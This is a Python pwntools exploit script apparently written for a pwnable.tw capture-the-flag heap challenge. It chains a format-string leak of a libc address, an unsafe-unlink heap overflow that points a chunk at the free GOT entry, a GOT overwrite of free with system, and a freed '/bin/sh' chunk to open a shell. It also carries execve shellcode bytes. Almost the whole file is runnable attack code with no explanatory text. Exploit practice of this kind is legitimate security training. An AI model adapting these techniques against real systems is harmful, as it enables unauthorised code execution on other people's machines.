from pwn import *
import sys,getopt
import time


args = sys.argv[1:]
context(os='linux', arch='i386')
debug = 1 if '-nd' not in args else 0

proc_name = './pwn' # dont omit ./ 
local = 1 if '-r' not in args else 0
isattach = local & 1
bps = isattach & 1
#socat TCP4-LISTEN:10001,fork EXEC:./pwn1
ip = 'chall.pwnable.tw'
port = 10000
io = None
shellcode = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73"
shellcode += "\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0"
shellcode += "\x0b\xcd\x80"

libc = ELF("libc-2.23.so")
system_offset = libc.symbols['system']
setvbuf_offset = libc.symbols['setvbuf']
def makeio():
    global io 
    if local:
    	io = process(proc_name)
    else:
    	io = remote(ip,port)
def ru(data):
	return io.recvuntil(data)
def rv():
	return io.recv()
def ra():
    return io.recvall()
def sl(data):
	return io.sendline(data)
def sd(data):
	return io.send(data)
def rl():
	return io.recvline()
def sa(d,data):
    return io.sendlineafter(d,data)
def attach():
    log.info('attach' + str(attach))
    if isattach:
        if bps:
            gdb.attach(pidof(io)[0], open('bps'))
        else:
            gdb.attach(pidof(io)[0])
    

def pwn():
    makeio()
    attach()
    if debug:
        context.log_level = 'debug'
    
    log.info('USE FSB IN PRINT TO GET SYSTEM ADDR')
    sa('>','%p|%p') #__GI__IO_setvbuf+11
    data = ru('!')
    setvbuf11_addr = int(data.split('|')[1][0:10],16)
    system_addr = setvbuf11_addr - 11  - setvbuf_offset + system_offset
    log.info('system_addr' + hex(system_addr)) 

    log.info('ALLOCATA THREE CHUNKS')
    ru('5.Exit.');sl('1')
    ru('5.Exit.');sl('2')   
    ru('5.Exit.');sl('1')
    ru('5.Exit.');sl('1') 

    log.info('EDIT FIRST CHUNCK')
    p_addr = 0x0804A0A0
    payload = p32(0) + p32(0x79) +p32(p_addr-0xc) + p32(p_addr-0x08)  # fd bk + padding
    payload = payload.ljust(120,'A') + p32(0x78)
    ru('5.Exit.');sl('3');
    ru('>');sl('1');sl(payload)
    
    # edit success
    log.info('DELETE SECOND CHUNK')
    ru('5.Exit.');sl('4')
    ru('delete:');sl('2')
    # free got 0x0804A014

    log.info('MODIFY FIRST CHUNK PTR -> FREEGOT')
    freegot = 0x0804A014
    payload2 = 'A'*0xC + p32(0x0804A014) 
    ru('5.Exit.');sl('3')
    ru('>');sl('1');sl(payload2)

    #system
    log.info('MODIFY FREE GOT -> SYSTEM')
    ru('5.Exit.');sl('3');
    ru('>');sl('1');sl(p32(system_addr))

    # 
    log.info('ARRANGE /bin/sh\x00 IN CHUNK 3')
    payload3 = '/bin/sh\x00'
    ru('5.Exit.');sl('3');
    ru('>');sl('3');sl(payload3)

    #
    log.info('DELETE CHUNK 3 TO CALL SYSTEM')
    ru('5.Exit.');sl('4')
    ru('delete:');sl('3')

    io.interactive()


if __name__ == '__main__':
	pwn()

